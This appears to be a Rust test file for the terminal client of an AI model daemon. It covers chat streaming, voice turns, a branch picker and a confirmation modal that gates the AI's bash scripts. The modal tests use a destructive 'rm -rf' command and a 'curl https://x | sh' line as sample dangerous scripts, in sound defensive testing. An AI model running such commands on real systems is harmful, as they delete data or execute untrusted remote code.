use std::path::{Path, PathBuf};

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use ratatui::Terminal;
use ratatui::backend::TestBackend;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use tokio::net::UnixListener;
use tokio::task::JoinHandle;

use super::super::ui;
use super::attach::longest_common_prefix;
use super::*;

fn test_sleep_cfg() -> SleepConfig {
    let mut cfg = assistd_core::Config::default().sleep;
    cfg.idle_to_drowsy_mins = 0;
    cfg.idle_to_sleep_mins = 0;
    cfg
}

fn test_app() -> (App, mpsc::Receiver<ChatEvent>) {
    test_app_at(PathBuf::from("/tmp/assistd-test-nonexistent.sock"))
}

fn test_app_at(socket: PathBuf) -> (App, mpsc::Receiver<ChatEvent>) {
    let (tx, rx) = mpsc::channel::<ChatEvent>(16);
    let ipc = Arc::new(IpcClient::with_path(socket));
    let app = App::new(ipc, tx, "test-model".into(), test_sleep_cfg(), true, None);
    (app, rx)
}

fn typed(c: char) -> KeyEvent {
    KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE)
}

fn delta(text: &str) -> Event {
    Event::Delta {
        id: "r".into(),
        text: text.into(),
    }
}

fn done() -> Event {
    Event::Done { id: "r".into() }
}

fn delta_for(id: &str, text: &str) -> Event {
    Event::Delta {
        id: id.into(),
        text: text.into(),
    }
}

fn transcription_for(id: &str, text: &str) -> Event {
    Event::Transcription {
        id: id.into(),
        text: text.into(),
    }
}

fn rendered(app: &mut App) -> Vec<String> {
    let (lines, _) = app.output.render_view(80, 80);
    lines
        .iter()
        .map(|l| l.spans.iter().map(|s| s.content.as_ref()).collect())
        .collect()
}

fn line_index(lines: &[String], needle: &str) -> usize {
    lines
        .iter()
        .position(|l| l.contains(needle))
        .unwrap_or_else(|| panic!("{needle:?} missing from {lines:#?}"))
}

fn start_typed_turn(app: &mut App, id: &str, prompt: &str) {
    app.begin_turn(prompt, &[]);
    app.active_reply = Some(ActiveReply {
        id: id.into(),
        writer: None,
    });
}

fn reply(event: Event) -> ChatEvent {
    ChatEvent::Wire {
        stream: WireStream::Reply,
        event,
    }
}

fn status(event: Event) -> ChatEvent {
    ChatEvent::Wire {
        stream: WireStream::Status,
        event,
    }
}

/// Accept one dialog connection, read its request line, then stream
/// `events` back after a pause in which the query driver sees its writer
/// channel close with nothing readable.
fn mock_daemon(socket: &Path, events: Vec<Event>) -> JoinHandle<()> {
    let listener = UnixListener::bind(socket).unwrap();
    tokio::spawn(async move {
        let (stream, _) = listener.accept().await.unwrap();
        let (read, mut write) = stream.into_split();
        let mut reader = tokio::io::BufReader::new(read);
        let mut line = String::new();
        reader.read_line(&mut line).await.unwrap();
        tokio::time::sleep(Duration::from_millis(50)).await;
        for ev in events {
            let mut out = serde_json::to_string(&ev).unwrap();
            out.push('\n');
            write.write_all(out.as_bytes()).await.unwrap();
        }
    })
}

#[test]
fn branch_wire_error_releases_the_in_flight_op() {
    let (mut app, _rx) = test_app();
    app.generating = true;
    app.in_flight_branch_op = Some(BranchOp::Fork);
    app.on_chat_event(ChatEvent::WireError {
        stream: WireStream::Branch,
        message: "branch connect: no such file".into(),
    });
    assert!(app.in_flight_branch_op.is_none());
    assert!(app.generating, "a branch failure must not end the reply");
}

#[test]
fn status_stream_done_does_not_end_the_reply() {
    let (mut app, _rx) = test_app();
    app.generating = true;
    app.on_chat_event(reply(delta("hi")));
    app.on_chat_event(status(done()));
    assert!(app.generating);
    app.on_chat_event(reply(done()));
    assert!(!app.generating);
}

#[test]
fn voice_turn_spoken_over_a_typed_reply_waits_its_turn() {
    let (mut app, _rx) = test_app();
    start_typed_turn(&mut app, "typed", "typed question");
    app.on_chat_event(reply(delta_for("typed", "typed ")));
    app.on_chat_event(reply(transcription_for("voice", "spoken question")));
    app.on_chat_event(reply(delta_for("typed", "answer")));
    let lines = rendered(&mut app);
    assert!(
        lines.iter().any(|l| l.contains("typed answer")),
        "the transcript must not split the typed block: {lines:#?}",
    );

    app.on_chat_event(reply(Event::Done { id: "typed".into() }));
    assert!(!app.generating);

    app.on_chat_event(reply(delta_for("voice", "spoken answer")));
    assert!(
        app.generating,
        "the voice turn runs once the typed one ends"
    );
    let lines = rendered(&mut app);
    let typed = line_index(&lines, "typed answer");
    let spoken_q = line_index(&lines, "spoken question");
    let spoken_a = line_index(&lines, "spoken answer");
    assert!(typed < spoken_q, "transcript must not split the reply");
    assert!(spoken_q < spoken_a);

    app.on_chat_event(reply(Event::Done { id: "voice".into() }));
    assert!(!app.generating);
}

#[test]
fn another_turns_terminal_events_leave_the_owner_alone() {
    let (mut app, _rx) = test_app();
    start_typed_turn(&mut app, "typed", "typed question");
    app.on_chat_event(reply(delta_for("typed", "half ")));

    app.on_chat_event(reply(Event::Done { id: "other".into() }));
    assert!(app.generating, "a foreign Done must not end the reply");
    app.on_chat_event(reply(Event::Error {
        id: "other".into(),
        message: "voice turn rejected".into(),
    }));
    assert!(app.generating, "a foreign Error must not end the reply");
    assert_eq!(app.notice(), Some("voice turn rejected"));

    app.on_chat_event(reply(delta_for("typed", "written")));
    let lines = rendered(&mut app);
    assert!(
        lines.iter().any(|l| l.contains("half written")),
        "the owner's block stayed open: {lines:#?}",
    );
}

#[test]
fn a_transcript_is_dropped_when_its_turn_never_runs() {
    let (mut app, _rx) = test_app();
    start_typed_turn(&mut app, "typed", "typed question");
    app.on_chat_event(reply(transcription_for("voice", "spoken question")));
    app.on_chat_event(reply(Event::Error {
        id: "voice".into(),
        message: "no capacity".into(),
    }));
    app.on_chat_event(reply(Event::Done { id: "typed".into() }));

    app.on_chat_event(reply(delta_for("later", "unrelated")));
    let lines = rendered(&mut app);
    assert!(
        !lines.iter().any(|l| l.contains("spoken question")),
        "a turn that never ran must not replay its transcript: {lines:#?}",
    );
}

#[test]
fn bus_turn_from_another_client_renders_with_its_transcript() {
    let (mut app, _rx) = test_app();
    app.on_chat_event(ChatEvent::Bus(transcription_for("ptt", "spoken question")));
    app.on_chat_event(ChatEvent::Bus(delta_for("ptt", "spoken answer")));
    assert!(app.generating);
    let lines = rendered(&mut app);
    assert!(line_index(&lines, "spoken question") < line_index(&lines, "spoken answer"));

    app.on_chat_event(ChatEvent::Bus(Event::Done { id: "ptt".into() }));
    assert!(!app.generating);
}

#[test]
fn bus_copies_of_this_chats_query_are_ignored() {
    let (mut app, _rx) = test_app();
    app.remember_own_turn("typed");
    start_typed_turn(&mut app, "typed", "typed question");
    app.on_chat_event(reply(delta_for("typed", "answer")));
    app.on_chat_event(ChatEvent::Bus(delta_for("typed", "echo")));
    app.on_chat_event(ChatEvent::Bus(Event::Done { id: "typed".into() }));

    assert!(app.generating, "only the dialog's own Done ends the reply");
    let lines = rendered(&mut app);
    assert!(
        !lines.iter().any(|l| l.contains("echo")),
        "the bus copy must not be drawn twice: {lines:#?}",
    );
}

#[test]
fn bus_terminal_events_of_unseen_requests_are_ignored() {
    let (mut app, _rx) = test_app();
    app.on_chat_event(ChatEvent::Bus(Event::Done { id: "poll".into() }));
    app.on_chat_event(ChatEvent::Bus(Event::Error {
        id: "wake".into(),
        message: "already active".into(),
    }));
    assert!(app.active_reply.is_none());
    assert_eq!(app.notice(), None);
}

#[tokio::test]
async fn query_driver_outlives_its_writer_channel() {
    let dir = tempfile::tempdir().unwrap();
    let socket = dir.path().join("mock.sock");
    let server = mock_daemon(&socket, vec![delta("hi"), done()]);

    let (mut app, mut rx) = test_app_at(socket);
    app.spawn_query("hi".into(), Vec::new());
    app.active_reply = None;

    let mut terminal = false;
    while !terminal {
        match tokio::time::timeout(Duration::from_secs(5), rx.recv())
            .await
            .expect("query driver stalled once the writer channel closed")
        {
            Some(ChatEvent::Wire { event, .. }) => terminal = event.is_terminal(),
            other => panic!("unexpected chat event: {other:?}"),
        }
    }
    server.await.unwrap();
}

#[tokio::test]
async fn capabilities_are_refetched_only_when_the_model_comes_up() {
    let (mut app, _rx) = test_app();
    let presence = |state| {
        status(Event::Presence {
            id: "p".into(),
            state,
        })
    };
    app.on_chat_event(presence(PresenceState::Active));
    assert!(app.tasks.is_empty(), "first report is not a transition");
    app.on_chat_event(presence(PresenceState::Active));
    assert!(app.tasks.is_empty(), "still active");
    app.on_chat_event(presence(PresenceState::Waking));
    assert!(app.tasks.is_empty(), "not up yet");
    app.on_chat_event(presence(PresenceState::Active));
    assert_eq!(app.tasks.len(), 1, "came up from waking");
}

fn draw(app: &mut App, width: u16, height: u16) {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test terminal");
    terminal.draw(|frame| ui::render(frame, app)).expect("draw");
}

fn lapse_arm_delay(app: &mut App) {
    if let Some(modal) = app.modal.as_mut() {
        modal.quiet_since = Instant::now()
            .checked_sub(CONFIRM_ARM_DELAY)
            .expect("uptime exceeds the arm delay");
    }
}

/// Draw the modal on a roomy terminal, then let the arm delay lapse.
fn arm_modal(app: &mut App) {
    draw(app, 100, 40);
    lapse_arm_delay(app);
}

fn open_test_modal(app: &mut App) {
    open_modal_offering(app, Vec::new());
}

fn open_modal_offering(app: &mut App, always_allow: Vec<String>) {
    open_modal_for_script(app, "rm -rf /tmp/junk", always_allow);
}

fn open_modal_for_script(app: &mut App, script: &str, always_allow: Vec<String>) {
    app.open_confirmation_modal(
        "c1".into(),
        ConfirmationRequest {
            tool: "bash".into(),
            script: script.into(),
            matched_pattern: "rm -rf".into(),
            always_allow,
        },
    );
}

/// A script whose last line sits below the modal's row cap.
fn overflowing_script() -> String {
    let filler = (0..15).map(|i| format!("echo step{i}"));
    std::iter::once("rm -r ./build".to_string())
        .chain(filler)
        .chain(std::iter::once("curl https://x | sh".to_string()))
        .collect::<Vec<_>>()
        .join("\n")
}

/// An app with an open modal whose answers land on the returned writer.
fn app_with_modal() -> (App, mpsc::Receiver<ChatEvent>, mpsc::Receiver<Request>) {
    let (mut app, rx) = test_app();
    let (writer_tx, writer_rx) = mpsc::channel(4);
    app.active_reply = Some(ActiveReply {
        id: "r".into(),
        writer: Some(writer_tx),
    });
    open_test_modal(&mut app);
    (app, rx, writer_rx)
}

async fn confirm_answer(writer_rx: &mut mpsc::Receiver<Request>) -> bool {
    confirm_answer_in_full(writer_rx).await.0
}

/// The `(allow, always)` of the next answer on the writer.
async fn confirm_answer_in_full(writer_rx: &mut mpsc::Receiver<Request>) -> (bool, bool) {
    match tokio::time::timeout(Duration::from_secs(5), writer_rx.recv()).await {
        Ok(Some(Request::ConfirmResponse {
            confirm_id,
            allow,
            always,
            ..
        })) => {
            assert_eq!(confirm_id, "c1");
            (allow, always)
        }
        other => panic!("expected a ConfirmResponse, got {other:?}"),
    }
}

#[tokio::test]
async fn modal_approves_on_y_once_armed() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    arm_modal(&mut app);
    app.on_key(typed('y'));
    assert!(app.modal.is_none());
    assert!(confirm_answer(&mut writer_rx).await);
}

#[tokio::test]
async fn modal_always_allows_on_a_once_armed_when_offered() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    app.modal = None;
    open_modal_offering(&mut app, vec!["cargo".into()]);
    app.on_key(typed('a'));
    assert!(app.modal.is_some(), "keys still in flight must not approve");
    arm_modal(&mut app);
    app.on_key(typed('a'));
    assert!(app.modal.is_none());
    assert_eq!(confirm_answer_in_full(&mut writer_rx).await, (true, true));
}

#[tokio::test]
async fn modal_ignores_a_when_nothing_is_offered() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    arm_modal(&mut app);
    app.on_key(typed('a'));
    assert!(app.modal.is_some());
    assert!(writer_rx.try_recv().is_err());
    arm_modal(&mut app);
    app.on_key(typed('y'));
    assert_eq!(confirm_answer_in_full(&mut writer_rx).await, (true, false));
}

#[tokio::test]
async fn modal_typing_restarts_the_arm_delay() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    app.modal = None;
    open_modal_offering(&mut app, vec!["cargo".into()]);
    arm_modal(&mut app);
    app.on_key(typed('s'));
    app.on_key(typed('a'));
    app.on_key(typed('y'));
    assert!(
        app.modal.is_some(),
        "keys typed in a burst must not approve"
    );
    assert!(writer_rx.try_recv().is_err());
}

#[tokio::test]
async fn modal_ignores_approval_before_armed() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    app.on_key(typed('y'));
    app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
    assert!(app.modal.is_some(), "keys still in flight must not approve");
    assert!(writer_rx.try_recv().is_err());
}

#[tokio::test]
async fn modal_refuses_approval_while_script_rows_are_hidden() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    app.modal = None;
    open_modal_for_script(&mut app, &overflowing_script(), vec!["curl".into()]);
    for c in ['y', 'Y', 'a', 'A'] {
        arm_modal(&mut app);
        app.on_key(typed(c));
        assert!(app.modal.is_some(), "{c:?} approved a partly hidden script");
    }
    assert!(writer_rx.try_recv().is_err());
    app.on_key(typed('n'));
    assert!(app.modal.is_none());
    assert!(!confirm_answer(&mut writer_rx).await);
}

#[tokio::test]
async fn modal_approves_once_a_taller_terminal_shows_the_whole_script() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    app.modal = None;
    open_modal_for_script(&mut app, "a\nb\nc\nd\ne", Vec::new());
    draw(&mut app, 100, 10);
    lapse_arm_delay(&mut app);
    app.on_key(typed('y'));
    assert!(
        app.modal.is_some(),
        "a short terminal hid part of the script"
    );
    arm_modal(&mut app);
    app.on_key(typed('y'));
    assert!(app.modal.is_none());
    assert!(confirm_answer(&mut writer_rx).await);
}

#[tokio::test]
async fn modal_refuses_approval_before_its_first_frame() {
    let (mut app, _rx, mut writer_rx) = app_with_modal();
    lapse_arm_delay(&mut app);
    app.on_key(typed('y'));
    assert!(app.modal.is_some());
    assert!(writer_rx.try_recv().is_err());
}

#[tokio::test]
async fn modal_enter_never_approves() {
    let (mut app, _rx, _writer_rx) = app_with_modal();
    arm_modal(&mut app);
    app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
    assert!(app.modal.is_some());
}

#[tokio::test]
async fn modal_denies_on_n_or_esc_even_before_armed() {
    for key in [KeyCode::Char('n'), KeyCode::Char('N'), KeyCode::Esc] {
        let (mut app, _rx, mut writer_rx) = app_with_modal();
        app.on_key(KeyEvent::new(key, KeyModifiers::NONE));
        assert!(app.modal.is_none(), "{key:?}");
        assert!(!confirm_answer(&mut writer_rx).await, "{key:?}");
    }
}

#[test]
fn modal_closes_when_the_turn_ends() {
    let (mut app, _rx) = test_app();
    app.on_chat_event(reply(delta("hi")));
    open_test_modal(&mut app);
    app.on_chat_event(reply(done()));
    assert!(app.modal.is_none(), "a finished turn cannot be answered");
}

#[tokio::test]
async fn modal_swallows_unrelated_keys() {
    let (mut app, _rx, _writer_rx) = app_with_modal();
    arm_modal(&mut app);
    app.on_key(typed('x'));
    app.on_key(typed('z'));
    assert!(app.modal.is_some());
    assert!(app.input.buffer().is_empty());
}

#[test]
fn tool_call_then_result_creates_one_block_with_command() {
    let (mut app, _rx) = test_app();
    app.on_chat_event(reply(Event::ToolCall {
        id: "c1".into(),
        name: "run".into(),
        args: serde_json::json!({"command": "ls /tmp"}),
    }));
    let running = rendered(&mut app);
    assert!(running.contains(&"▎ $ ls /tmp".to_string()), "{running:#?}");
    assert!(
        running.contains(&"▎ running… (0s)".to_string()),
        "{running:#?}"
    );
    app.on_chat_event(reply(Event::ToolResult {
        id: "c1".into(),
        name: "run".into(),
        result: serde_json::json!({
            "output": "a\nb\n[exit:0 | 5ms]",
            "exit_code": 0,
            "truncated": false,
            "duration_ms": 5,
        }),
    }));
    let lines = rendered(&mut app);
    assert!(!lines.iter().any(|l| l.contains("running…")), "{lines:#?}");
    assert_eq!(lines.iter().filter(|l| l.contains("$ ls /tmp")).count(), 1);
    assert!(lines.contains(&"▎ $ ls /tmp".to_string()), "{lines:#?}");
    assert!(
        lines.iter().any(|l| l.ends_with("[exit:0 | 5ms]")),
        "{lines:#?}"
    );
}

fn type_str(app: &mut App, s: &str) {
    for c in s.chars() {
        app.on_key(typed(c));
    }
}

#[test]
fn tab_accepts_selection_and_fills_buffer() {
    let (mut app, _rx) = test_app();
    type_str(&mut app, "/f");
    app.on_key(KeyEvent::new(KeyCode::Tab, KeyModifiers::NONE));
    assert_eq!(app.input.buffer(), "/fork");
    assert!(app.slash_suggestions().is_empty());
}

fn picker_entry(name: &str, session: &str, current: bool, active_sess: bool) -> BranchListEntry {
    BranchListEntry {
        name: name.into(),
        parent_branch_name: None,
        fork_point_seq: None,
        message_count: 0,
        is_current_in_session: current,
        is_active_session: active_sess,
        session_short: session.into(),
        session_title: None,
    }
}

#[test]
fn open_branch_picker_highlights_active_current() {
    let (mut app, _rx) = test_app();
    app.branches_buffer = vec![
        picker_entry("main", "aaaaaaaa", false, false),
        picker_entry("main", "bbbbbbbb", true, true),
        picker_entry("feat", "bbbbbbbb", false, true),
    ];
    app.open_branch_picker();
    let picker = app.picker_modal.as_ref().expect("picker opened");
    assert_eq!(picker.selected, 1);
    assert_eq!(picker.entries.len(), 3);
}

#[test]
fn picker_current_target_is_session_qualified() {
    let modal = BranchPickerModal {
        entries: vec![picker_entry("feature-x", "deadbeef", false, false)],
        selected: 0,
    };
    assert_eq!(
        modal.current_target().as_deref(),
        Some("deadbeef/feature-x")
    );
}

#[test]
fn longest_common_prefix_stops_at_char_boundaries() {
    assert_eq!(longest_common_prefix(&["é1.txt", "è2.txt"]), "");
    assert_eq!(longest_common_prefix(&["日本a", "日本b"]), "日本");
    assert_eq!(longest_common_prefix(&["日本", "日本語"]), "日本");
    assert_eq!(longest_common_prefix(&["abc"]), "abc");
    assert_eq!(longest_common_prefix(&[]), "");
}
